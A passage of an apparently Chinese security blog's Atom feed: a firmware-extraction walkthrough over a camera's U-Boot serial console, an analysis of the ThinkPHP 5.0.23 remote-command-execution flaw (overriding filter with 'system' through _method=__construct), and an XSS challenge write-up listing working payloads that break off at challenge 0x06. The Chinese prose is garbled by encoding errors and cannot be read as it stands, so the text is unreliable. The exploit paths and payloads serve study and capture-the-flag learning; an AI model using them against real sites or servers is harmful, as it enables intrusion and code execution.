    <content type="html"><![CDATA[<p>ç”±äºä¹‹å‰è€ƒç ”ä¸€ç›´æ²¡æœ‰æ—¶é—´æï¼Œç°åœ¨ç»ˆäºæœ‰ç©ºæ¥åšä¸€äº›å°å®éªŒã€‚</p><h2 id="å›ºä»¶æå–æ–¹å¼"><a href="#å›ºä»¶æå–æ–¹å¼" class="headerlink" title="å›ºä»¶æå–æ–¹å¼"></a>å›ºä»¶æå–æ–¹å¼</h2><p>æ¯”è¾ƒä¸»æµçš„æå–æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ol><li>å®˜ç½‘æˆ–è€…æ‰¾å®¢æœç´¢è¦å›ºä»¶</li><li>åœ¨çº¿å‡çº§çš„æ—¶å€™æŠ“åŒ…å¾—åˆ°ä¸‹è½½åœ°å€</li><li>æ‹†flashèŠ¯ç‰‡ï¼Œç”¨ç¼–ç¨‹å™¨è¯»å–èŠ¯ç‰‡å†…å®¹ï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨çƒ§å½•å¤¹ç›´æ¥è·å–flashï¼Œä½†æ˜¯æœ‰äº›æ—¶å€™æœ‰ä¿æŠ¤å¼•è„šå°±åªèƒ½æ‹†èŠ¯ç‰‡ï¼‰</li><li>ç”¨ç¡¬ä»¶ç”µè·¯çš„è°ƒè¯•æ¥å£å’Œå›ºä»¶çš„bootloaderè·å–å›ºä»¶</li><li>ä»ä¸²å£è¿›å…¥ç³»ç»Ÿä¹‹åï¼Œæ‰“åŒ…å›ºä»¶</li></ol><p>é¦–å…ˆï¼Œè¿™ä¸ªæ‘„åƒå¤´ç°åœ¨æ²¡æœ‰å‡çº§æ“ä½œï¼Œå®˜ç½‘ä¹Ÿæ²¡æœ‰å›ºä»¶ã€‚çƒ§å½•å¤¹ç°åœ¨è¿˜ç”¨çš„ä¸ç†Ÿç»ƒï¼Œåœ¨åˆ†æä¹‹åå†³å®šç”¨ç¡¬ä»¶è°ƒè¯•æ¥å£æ¥è·å–å›ºä»¶ã€‚</p><h2 id="TTLæ¥å£çº¿åº"><a href="#TTLæ¥å£çº¿åº" class="headerlink" title="TTLæ¥å£çº¿åº"></a>TTLæ¥å£çº¿åº</h2><p>è¿™é‡Œæ¨èä¸€ç¯‡ä»™æœå¤§ä½¬å†™çš„çœé’±ç‰ˆæµ‹åº <a href="https://bbs.pediy.com/thread-246405.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246405.htm</a> ï¼Œé€šè¿‡ä¸‡ç”¨è¡¨å°±èƒ½ç®€å•åˆ¤æ–­vccå’Œgndï¼Œgndå¯ä»¥ä½¿ç”¨èœ‚é¸£æ¡£å¿«é€Ÿåˆ¤æ–­ï¼Œvccå¯ä»¥ç”¨ç›´æµç”µå‹æµ‹é‡ï¼Œé»‘è¡¨ç¬”æ¥gndï¼Œçº¢è¡¨ç¬”æ¢æµ‹å…¶ä»–æ¥å£ï¼Œå¦‚æœæ˜¯3.3væˆ–è€…5vï¼Œé‚£çº¢è¡¨ç¬”æ‰€åœ¨æ¥å£å°±æ˜¯vccï¼Œéšåtxdå’Œrxdéœ€è¦å…ˆè¿æ¥æµ‹è¯•ï¼Œå¦‚æœä¸è¡Œå†äº¤æ¢å¼•è„šã€‚</p><img src="/2019/02/18/yingshi-camera-firmware-extract/1.jpg"><p>å…¶ä¸­ç”µè·¯æ¿çš„txdå’Œrxdè¦å’Œusb-ttlè½¬æ¥å™¨çš„rxdå’Œtxdç›¸è¿ï¼Œæ¥åœ°çº¿å¯¹æ¥åœ°çº¿ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚è¿™é‡Œæ¨èä½¿ç”¨å…¨éš”ç¦»å‹çš„usb-ttlï¼Œå¯ä»¥é˜²çƒ§ç”µè„‘æ¥å£ã€‚</p><p>è¿™é‡Œé‡‡ç”¨çš„æ˜¯å¤–éƒ¨ä¾›ç”µçš„æ–¹å¼è¿›å…¥è®¾å¤‡çš„ubootç³»ç»Ÿï¼Œæ‰€ä»¥éœ€è¦æ¥ä¸Šç”µæºç„¶åå†å°†usb-ttlæ¥å…¥ç”µè„‘çš„æ¥å£ã€‚</p><p>åœ¨ç„Šæ¥çš„æ—¶å€™è¦ç‰¹åˆ«æ³¨æ„ä¸è¦å°†ç„Šç‚¹è¿æ¥åœ¨ä¸€èµ·äº†ï¼Œè¿™æ ·ä¼šå¯¼è‡´ä¸²å£è¿æ¥ä¸æ­£å¸¸ï¼Œè¦ä¹ˆæ²¡æœ‰æ•°æ®æ˜¾ç¤ºï¼Œè¦ä¹ˆä¼šæ— æ³•è¾“å…¥ã€‚</p><h2 id="å¯¼å‡ºå›ºä»¶"><a href="#å¯¼å‡ºå›ºä»¶" class="headerlink" title="å¯¼å‡ºå›ºä»¶"></a>å¯¼å‡ºå›ºä»¶</h2><p>è¿™é‡Œä½¿ç”¨secureCRTè¿æ¥ä¸²å£ï¼Œè¿›å…¥æ‘„åƒå¤´ç³»ç»Ÿã€‚æˆ‘æ˜¯windowsç³»ç»Ÿï¼Œé€šè¿‡è®¾å¤‡ç®¡ç†å™¨å¯ä»¥çœ‹åˆ°è¿æ¥çš„comå£ï¼Œä¹‹åé…ç½®è¿æ¥ã€‚</p><img src="/2019/02/18/yingshi-camera-firmware-extract/2.png"><p>115200æ˜¯æ¯”è¾ƒå¸¸ç”¨çš„æ³¢ç‰¹ç‡ï¼Œå…¶ä¸­è¦æ³¨æ„æµæ§åˆ¶æ˜¯ä¸é€‰çš„ï¼Œå› ä¸ºæ²¡æœ‰è¿›å…¥æ­£å¸¸çš„ç³»ç»Ÿï¼Œè€Œæ˜¯ubootï¼Œæ‰€ä»¥ä¸éœ€è¦è¿™äº›æµæ§åˆ¶åè®®ã€‚</p><p>è¿æ¥æˆåŠŸä¹‹åä¸€ç›´è·³é”™è¯¯â€¦â€¦æ²¡åŠæ³•é‡ç½®ä¸€ä¸‹ï¼Œåœ¨è¿›å…¥ç³»ç»Ÿä¹‹å‰å®ƒä¼šç¡®è®¤æ˜¯å¦è¿›å…¥ç³»ç»Ÿï¼Œè¿™é‡Œè¦æŒ‰<code>ctrl+u</code>ä¸­æ–­è‡ªåŠ¨è¿›ç³»ç»Ÿï¼Œè¿™æ ·æˆ‘ä»¬å°±æˆåŠŸè¿›å…¥ubootç³»ç»Ÿã€‚</p><img src="/2019/02/18/yingshi-camera-firmware-extract/3.png"><p>æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªå‘½ä»¤ï¼Œ<code>bdinfo</code>ï¼Œ<code>printenv</code>ï¼Œ<code>sf</code>ï¼Œ<code>md</code></p><p>é€šè¿‡<code>bdinfo</code>ï¼Œå¯ä»¥çŸ¥é“ä¸€äº›åŸºç¡€çš„ç¡¬ä»¶è®¾å®šã€‚</p><img src="/2019/02/18/yingshi-camera-firmware-extract/4.png"><p><code>printenv</code>è·å¾—ç¯å¢ƒå˜é‡çš„å…·ä½“æ•°å€¼ã€‚</p><img src="/2019/02/18/yingshi-camera-firmware-extract/5.png"><p><code>sf probe 0</code>é€‰æ‹©æˆ‘ä»¬çš„flashèŠ¯ç‰‡ã€‚</p><img src="/2019/02/18/yingshi-camera-firmware-extract/6.png"><p>çŸ¥é“flashèŠ¯ç‰‡å¤§å°ä¸º8Mï¼Œç„¶ååœ¨ç³»ç»Ÿä¸€å¼€å§‹ä¼šæ˜¾ç¤ºflashçš„åœ°å€åˆ†é…</p><img src="/2019/02/18/yingshi-camera-firmware-extract/7.png"><p>ç”±äºå†…å­˜æœ‰å¾ˆå¤šæ²¡æœ‰ä½¿ç”¨çš„éƒ¨åˆ†ï¼Œæå–æ€è·¯å°±æ˜¯æŠŠflashä¸­çš„å›ºä»¶è¯»åœ¨æœªä½¿ç”¨çš„å†…å­˜ä¸­ï¼Œç„¶åç”¨<code>md</code>å‘½ä»¤è¯»å–å‡ºæ¥</p><p><code>sf read 0xa1000000 0 0x800000</code></p><p>å°†flashçš„å›ºä»¶è¯»å‡ºæ¥ä¹‹åï¼ŒéªŒè¯ä¸€ä¸‹ï¼Œè¯»å–linuxå†…æ ¸çœ‹çœ‹æœ‰æ²¡æœ‰ç›¸å…³çš„ä¸œè¥¿ã€‚</p><p><code>md 0xa1060000 0xa0</code></p><img src="/2019/02/18/yingshi-camera-firmware-extract/8.png"><p>éªŒè¯æˆåŠŸï¼Œç°åœ¨å°±è¦æŠŠæ•´ä¸ªå›ºä»¶å…¨éƒ¨å¯¼å‡ºæ¥ã€‚<code>md 0xa1000000 0x800000</code>ã€‚å°†ç»“æœä¿å­˜åœ¨ä¼šè¯æ—¥å¿—ä¸­ï¼Œè¿™æ ·å°±å¾—åˆ°äº†å›ºä»¶çš„äºŒè¿›åˆ¶çš„æ–‡æœ¬å†…å®¹ã€‚å†è½¬æ¢æˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå³å¾—åˆ°å›ºä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">hex_file = open(<span class="string">'session.log'</span>, <span class="string">'r'</span>)</span><br><span class="line">bin_file = open(<span class="string">'hex2bin.bin'</span>, <span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    line = hex_file.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    strs = line.split(<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> strs:</span><br><span class="line">        bin_file.write(binascii.a2b_hex(string))</span><br></pre></td></tr></table></figure><img src="/2019/02/18/yingshi-camera-firmware-extract/9.png"><p>ä½†æ˜¯å‘ç°å’Œä¹‹å‰å¾—åˆ°çš„å›ºä»¶ç»“æ„æœ‰çŸ›ç›¾ï¼Œæ€ä¹ˆä¼šåªæœ‰ä¸€ä¸ªzImageã€‚ã€‚ã€‚æ‰€ä»¥åˆ‡æ¢æˆå°ç«¯å†™å…¥äºŒè¿›åˆ¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">hex_file = open(<span class="string">'session.log'</span>, <span class="string">'r'</span>)</span><br><span class="line">bin_file = open(<span class="string">'hex2bin.bin'</span>, <span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    line = hex_file.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    strs = line.split(<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> strs:</span><br><span class="line">        bin_file.write(binascii.a2b_hex(string[<span class="number">-2</span>:]))</span><br><span class="line">        bin_file.write(binascii.a2b_hex(string[<span class="number">-4</span>:<span class="number">-2</span>]))</span><br><span class="line">        bin_file.write(binascii.a2b_hex(string[<span class="number">-6</span>:<span class="number">-4</span>]))</span><br><span class="line">        bin_file.write(binascii.a2b_hex(string[:<span class="number">-6</span>]))</span><br></pre></td></tr></table></figure><img src="/2019/02/18/yingshi-camera-firmware-extract/10.png"><p>æœç„¶æ˜¯å¤§å°ç«¯çš„é—®é¢˜ï¼Œåˆ‡æ¢æˆå°ç«¯åºå°±èƒ½ç”¨binwalkåˆ†æå‡ºæ­£ç¡®çš„ç»“æ„ã€‚è¿™ä¸ªæˆ‘ä»¬åœ¨æå–çš„æ—¶å€™ä¸€å®šè¦æ³¨æ„å¤§å°ç«¯é¡ºåºé—®é¢˜ã€‚</p><p>æœ€åæ„Ÿè°¢é©¬è‰¯ï¼Œåœ¨æ“ä½œè¿‡ç¨‹ä¸­çš„æŒ‡ç‚¹å’Œå¼•å¯¼ï¼Œç„Šæ¥å›¾ä¹Ÿæ˜¯å‡ºè‡ªé©¬è‰¯ï¼Œå­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†æ„Ÿæ¿€ä¸å°½ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ç”±äºä¹‹å‰è€ƒç ”ä¸€ç›´æ²¡æœ‰æ—¶é—´æï¼Œç°åœ¨ç»ˆäºæœ‰ç©ºæ¥åšä¸€äº›å°å®éªŒã€‚&lt;/p&gt;
&lt;h2 id=&quot;å›ºä»¶æå–æ–¹å¼&quot;&gt;&lt;a href=&quot;#å›ºä»¶æå–æ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;å›ºä»¶æå–æ–¹å¼&quot;&gt;&lt;/a&gt;å›ºä»¶æå–æ–¹å¼&lt;/h2&gt;&lt;p&gt;æ¯”è¾ƒä¸»æµçš„æå–æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§ï¼š&lt;/p
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="IOT" scheme="https://hurricane618.me/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp 5.0.23 rceåˆ†æå’Œå¤ç°</title>
    <link href="https://hurricane618.me/2019/02/03/thinkphp-5-0-23-rce/"/>
    <id>https://hurricane618.me/2019/02/03/thinkphp-5-0-23-rce/</id>
    <published>2019-02-03T02:08:15.000Z</published>
    <updated>2019-02-03T02:16:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å…¥å£æ˜¯åœ¨app::run()ï¼Œè¿™é‡Œæœ‰åˆ›å»ºhttpçš„è¯·æ±‚å®ä¾‹ï¼Œ</p><img src="/2019/02/03/thinkphp-5-0-23-rce/1.png"><p>éšååœ¨åé¢ä¼šæœ‰è·¯ç”±æ£€æŸ¥ï¼Œä»è¿™é‡Œè·Ÿè¿›å‡½æ•°<code>routeCheck</code>ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/2.png"><p>åœ¨è·¯ç”±æ£€æŸ¥ä¸­ä¼šåˆ°è·¯ç”±ç±»çš„checkæ–¹æ³•å¤„ï¼Œç»§ç»­è·Ÿè¿›ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/3.png"><p>åœ¨checkä¸­ä¼šæœ‰è·å–å½“å‰æ–¹æ³•çš„method</p><img src="/2019/02/03/thinkphp-5-0-23-rce/4.png"><p>ä¸‹é¢åœ¨methodä¸­ä¼šè·å–<code>var_method</code>è¿™ä¸ªä¼ªå˜é‡ï¼Œå…¶å®è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬é€šè¿‡postä¼ è¿›çš„<code>_method</code>ï¼Œè¿™é‡Œè¿›å…¥åˆ¤æ–­ä¹‹åä¼šå°†æˆ‘ä»¬postçš„å€¼å½“åšRequestç±»çš„æ–¹æ³•è°ƒç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬çš„pocæ˜¯ä¼ å…¥çš„<code>__construct</code>ï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨å®ƒçš„æ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°æ˜¯postæ•°æ®ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/5.png"><p>ç»§ç»­è·Ÿè¿›æ„é€ æ–¹æ³•ï¼Œè¿™é‡Œçš„foreachä¼šéå†æ‰€æœ‰å˜é‡ï¼Œå°†å­˜åœ¨çš„å‚æ•°å…¨éƒ¨è¦†ç›–æ‰ï¼Œåœ¨æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ä¸­çš„filterï¼Œå°±æŠŠä¹‹å‰çš„è¦†ç›–äº†ï¼Œå¹¶ä¸”åœ¨è¿™é‡Œä¼ å…¥methodä¸ºgetçš„åŸå› ä¹Ÿæ˜¯å› ä¸ºä¹‹å‰æ³¨å†Œè·¯ç”±æ˜¯getæ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œè¦æŠŠè¯·æ±‚çš„methodè¦†ç›–æˆgetï¼Œé¿å…æŠ¥é”™ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/6.png"><p>åœ¨è¿™è°ƒç”¨å®Œæˆä¹‹å<code>routeCheck</code>å°†è¿”å›<code>method</code>èµ‹å€¼ç»™<code>dispatch</code>ã€‚ä¹‹åä¼šç»§ç»­åœ¨runå‡½æ•°é‡Œé¢æ‰§è¡Œexecå‡½æ•°ã€‚ç”±äºtypeä¸ºmethodæ‰§è¡Œç›¸åº”çš„åˆ†æ”¯ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/7.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/8.png"><p>è€Œè¿™é‡Œçš„<code>param</code>æ–¹æ³•èƒ½è·å–å‚æ•°ï¼Œå¹¶ä¸”å’ŒURLä¸­çš„å‚æ•°åˆå¹¶ã€‚è¿™é‡Œå¾—åˆ°çš„å‚æ•°å°±æ˜¯postæ•°æ®ä¸­çš„<code>get[]=dir</code></p><img src="/2019/02/03/thinkphp-5-0-23-rce/9.png"><p>å®ƒçš„è¿”å›è°ƒç”¨äº†<code>input</code>æ–¹æ³•ï¼Œè·Ÿè¿›<code>input</code>ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/10.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/11.png"><p><code>input</code>æœ€åå°†å‚æ•°å’Œ<code>filter</code>ä¸€èµ·ä¼ å…¥<code>array_walk_recursive</code>ä¸­ã€‚å…¶ä¸­å‚æ•°ä¸­æœ‰æˆ‘ä»¬ä¼ çš„<code>dir</code>ï¼Œè€Œ<code>filter</code>é€šè¿‡<code>getFilter</code>æœ‰æˆ‘ä»¬ä¼ çš„<code>system</code>ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/12.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/13.png"><p>åœ¨è¿™ä¹‹åè°ƒç”¨çš„<code>array_walk_recursive</code>ä¼šç”¨<code>filterValue</code>ï¼Œæ¥å¤„ç†æ•°æ®ï¼Œåœ¨è¿™ä¹‹ä¸­ç”¨<code>call_user_func</code>ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/14.png"><p>è¿™é‡Œ<code>system</code>å’Œ<code>dir</code>åˆ†åˆ«æ˜¯filterå’Œvalueä¸­çš„å€¼ï¼Œå‡‘åœ¨ä¸€èµ·å°±è§¦å‘å‘½ä»¤æ‰§è¡Œã€‚</p><p>è¿™é‡Œæ˜¯ç¬¬ä¸€ä¸ªpocçš„åˆ†æï¼Œè€Œç¬¬äºŒä¸ªpocæ¯”è¾ƒç±»ä¼¼ï¼ŒåŒæ ·æ˜¯åˆ©ç”¨inputå‡½æ•°ï¼Œè¿™é‡Œåˆ©ç”¨çš„ç‚¹æ˜¯åœ¨paramçš„<code>$this-&gt;method(true)</code>ä¸­ã€‚</p><p>å› ä¸ºæ˜¯trueæ‰€ä»¥è¿›å…¥äº†<code>server(&#39;REQUEST_METHOD&#39;)</code>ï¼Œæœ€ååŒæ ·åˆ°inputä¸­ï¼Œå¹¶ä¸”dataæ˜¯serveræ•°ç»„ï¼ŒfilteråŒæ ·æ˜¯systemã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/15.png"><p>é€ æˆçš„æ•ˆæœéƒ½æ˜¯å‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><img src="/2019/02/03/thinkphp-5-0-23-rce/16.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/17.png"><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ä¹Ÿç®—æ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚vscode+xdebugçš„åŠ¨æ€è°ƒè¯•æ–¹æ¡ˆï¼Œç‰¹åˆ«çš„è½»å·§ï¼ŒåŠŸèƒ½ç‚¹ä¹Ÿå¾ˆå®Œå–„ã€‚å…³äºåœ¨éªŒè¯pocçš„æ—¶å€™å…¶å®å‡ºäº†ä¸€äº›å°é—®é¢˜ï¼Œé‚£å°±æ˜¯æˆ‘çš„burpå‘é€çš„postæ•°æ®å’Œheaderä¹‹å‰å¤šäº†ä¸€ä¸ªç©ºè¡Œï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå¤šçš„ç©ºè¡Œå¯¼è‡´æˆ‘çš„pocè€æ˜¯å¤±è´¥â€¦â€¦è¿™ä¹Ÿæ˜¯æ³¨æ„å°çš„ç»†èŠ‚é—®é¢˜ï¼Œåªæœ‰åœ¨çœŸæ­£è°ƒè¯•çš„æ—¶å€™æ‰ä¼šè¢«å‘ç°ã€‚</p><p>ä»¥åè¿˜æ˜¯è¦å¤šåŠ¨æ‰‹å®è·µã€‚æ¥ä¸‹æ¥å‡ å¤©æˆ‘ä¼šç ”ç©¶ä¸€ç‚¹æ–°çš„ä¸œè¥¿ï¼Œæ‹­ç›®ä»¥å¾…å§ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://paper.seebug.org/787/" target="_blank" rel="noopener">https://paper.seebug.org/787/</a></p><p><a href="https://blog.csdn.net/qq_29647709/article/details/86307859" target="_blank" rel="noopener">https://blog.csdn.net/qq_29647709/article/details/86307859</a></p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;åˆ†æ&quot;&gt;&lt;/a&gt;åˆ†æ&lt;/h2&gt;&lt;p&gt;å…¥å£æ˜¯åœ¨app::run()ï¼Œè¿™é‡Œæœ‰åˆ›å»ºhttpçš„è¯·æ±‚å®ä¾‹ï¼Œ&lt;/p&gt;
&lt;img src=&quot;/2019/02/03/thinkphp-5-0-
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="PHP" scheme="https://hurricane618.me/tags/PHP/"/>
    
      <category term="ä»£ç å®¡è®¡" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>haozi xss æŒ‘æˆ˜èµ› writeup</title>
    <link href="https://hurricane618.me/2019/01/27/haozi-xss-challenges/"/>
    <id>https://hurricane618.me/2019/01/27/haozi-xss-challenges/</id>
    <published>2019-01-27T13:38:32.000Z</published>
    <updated>2019-01-27T13:40:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡ä»€ä¹ˆè¯´çš„ï¼Œdivæ ‡ç­¾+æ²¡è¿‡æ»¤ç›´æ¥æ’ <code>&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç‚¹åœ¨<code>&lt;textarea&gt;</code>è¿™ç§æ ‡ç­¾ä¸­ï¼Œéœ€è¦é—­åˆæ ‡ç­¾ï¼Œåœ¨æ’å…¥payloadã€‚<code>&lt;/textarea&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç‚¹åœ¨inputæ ‡ç­¾çš„valueå±æ€§ä¸­ï¼Œç„¶è€Œä¾æ—§æ²¡æœ‰è¿‡æ»¤ï¼Œåªè¦é€ƒé€¸åŒå¼•å·å†æ’å…¶ä»–æ ‡ç­¾å°±å¥½ã€‚<code>1&quot;&gt;&lt;svg/onload=alert(1)&gt;//</code></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>()</code>ï¼Œç›´æ¥æ¢æˆåå¼•å·å°±å¯ä»¥äº†ã€‚</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åå¼•å·ä¹ŸGGï¼Œåªå¥½ç¼–ç äº†è¿™é‡Œç”¨jsç¼–ç ã€‚<code>&lt;img src=1 onerror=&#39;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;&#39;&gt;</code></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'ğŸ˜‚'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ä¸€å¤´é›¾æ°´ï¼Œæäº†ç¼–ç æ— æ³•è§£æï¼Œæœ‰æŸ¥æ³¨é‡Šç½‘ä¸Šåˆæ²¡æœ‰â€¦â€¦ çœ‹äº†å…¶ä»–äººçš„writeupä¹‹åï¼Œç»“æœæœç„¶æ˜¯å¤šæ ·æ€§çš„æ³¨é‡Šã€‚</p><p>è¿™é‡Œåœ¨htmlé‡Œé¢çš„æ³¨é‡Šä¸­æœ‰ä¸¤ç§é™¤äº†ä¸€èˆ¬çš„<code>&lt;!-- --&gt;</code> è¿˜æœ‰å¯¹ç§°çš„å†™æ³•<code>&lt;!-- --!&gt;</code> ï¼Œæ‰€ä»¥è¿™é‡Œæ²¡è¿‡æ»¤å¯¹ç§°å†™æ³•ï¼Œæ‰€ä»¥å°±ç”¨è¿™ç§å°±å¯ä»¥é€ƒé€¸è¿‡æ»¤æ’æ ‡ç­¾ã€‚<code>--!&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span 